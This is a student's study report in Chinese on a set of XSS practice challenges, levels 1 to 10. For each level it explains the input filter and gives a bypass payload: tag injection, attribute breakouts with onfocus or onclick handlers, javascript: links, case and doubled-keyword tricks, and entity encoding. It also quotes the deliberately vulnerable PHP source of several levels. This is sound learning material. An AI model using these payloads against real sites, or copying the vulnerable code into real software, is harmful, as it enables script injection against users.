# 陈励文学习报告03## XSS题目### level1![LDBei.png](https://s1.328888.xyz/2022/04/03/LDBei.png)![LDEqv.png](https://s1.328888.xyz/2022/04/03/LDEqv.png)注入恶意代码```html<script>alert()</script>```![LDPw0.png](https://s1.328888.xyz/2022/04/03/LDPw0.png)### level2![LDxBJ.png](https://s1.328888.xyz/2022/04/03/LDxBJ.png)![LdU2F.png](https://s1.328888.xyz/2022/04/03/LdU2F.png)发现输入的代码被赋给value并打印网页，使用（">）闭合value![Lduvy.png](https://s1.328888.xyz/2022/04/03/Lduvy.png)### level3![Ldgzd.png](https://s1.328888.xyz/2022/04/03/Ldgzd.png)![Ld91Q.png](https://s1.328888.xyz/2022/04/03/Ld91Q.png)查看源码，发现<>被转义了，于是转为注入事件ondocus，构造payload，用 ' 将value闭合， //注释掉后面的 ‘```html' onfocus=alert()//```### level4![LdXD4.png](https://s1.328888.xyz/2022/04/03/LdXD4.png)![LdfwB.png](https://s1.328888.xyz/2022/04/03/LdfwB.png)尝试使用大写绕过，被过滤了，script都被过滤了，使用javascript伪协议来注入代码，```html"><a href="javascript:alert()>//```### level6![LdiBT.png](https://s1.328888.xyz/2022/04/03/LdiBT.png)![Ld282.png](https://s1.328888.xyz/2022/04/03/Ld282.png)利用大写绕过```html"><SCRIPT>alert()</SCRIPT>```### level7![LdAv7.png](https://s1.328888.xyz/2022/04/03/LdAv7.png)发现大小写这次被过滤了，输入```<script>alert()</script>```后script被过滤了，于是构造payload```"><scrscriptipt>alert()</scrscriptipt>//```![Ld4LX.png](https://s1.328888.xyz/2022/04/03/Ld4LX.png)### level8尝试javascript伪协议，script被过滤，换成大小写后还是被过滤，于是尝试用转义的方法![LdHzZ.png](https://s1.328888.xyz/2022/04/03/LdHzZ.png)![LdlD1.png](https://s1.328888.xyz/2022/04/03/LdlD1.png)源码```php<?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);//加入了大写变小写的转化函数$str2=str_replace("script","scr_ipt",$str);$str3=str_replace("on","o_n",$str2);$str4=str_replace("src","sr_c",$str3);$str5=str_replace("data","da_ta",$str4);$str6=str_replace("href","hr_ef",$str5);$str7=str_replace('"','&quot',$str6);echo '<center><form action=level8.php method=GET><input name=keyword  value="'.htmlspecialchars($str).'"><input type=submit name=submit value=添加友情链接 /></form></center>';?>```### level9查看下源码![Ldz8O.png](https://s1.328888.xyz/2022/04/03/Ldz8O.png)在构造伪协议是需要添加http://```<a href="javascr_ipt:alert()//http://">script被替换了，于是像上题一样用转义``````&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x29;http://```源码```php<?php ini_set("display_errors", 0);$str = strtolower($_GET["keyword"]);$str2=str_replace("script","scr_ipt",$str);$str3=str_replace("on","o_n",$str2);$str4=str_replace("src","sr_c",$str3);$str5=str_replace("data","da_ta",$str4);$str6=str_replace("href","hr_ef",$str5);$str7=str_replace('"','&quot',$str6);echo '<center><form action=level9.php method=GET><input name=keyword  value="'.htmlspecialchars($str).'"><input type=submit name=submit value=添加友情链接 /></form></center>';?><?phpif(false===strpos($str7,'http://')){  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';        }else{  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';}?><center><img src=level9.png></center><?php echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";?>```### level10![LdCRq.png](https://s1.328888.xyz/2022/04/03/LdCRq.png)发现有三个表单，于是从三个表单下手，构建poc，查看表单回显```<script>alert()</acript>&t_link=" type="text"&t_history=" type="text"&t_sort=" type="text"```![LdpvP.png](https://s1.328888.xyz/2022/04/03/LdpvP.png)![LdsLm.png](https://s1.328888.xyz/2022/04/03/LdsLm.png)出现可点击的框，同时第三个表单发生变化，于是利用第三个表单构建payload```<script>alert()</script>&t_sort=" type="text" onclick="alert()```onclick=“alert()通过点击框的方式将alert注入进去![Ld7CA.png](https://s1.328888.xyz/2022/04/03/Ld7CA.png)源码```php<?php ini_set("display_errors", 0);$str = $_GET["keyword"];$str11 = $_GET["t_sort"];$str22=str_replace(">","",$str11);$str33=str_replace("<","",$str22);echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center><form id=search><input name="t_link"  value="'.'" type="hidden"><input name="t_history"  value="'.'" type="hidden"><input name="t_sort"  value="'.$str33.'" type="hidden"></form></center>';?>```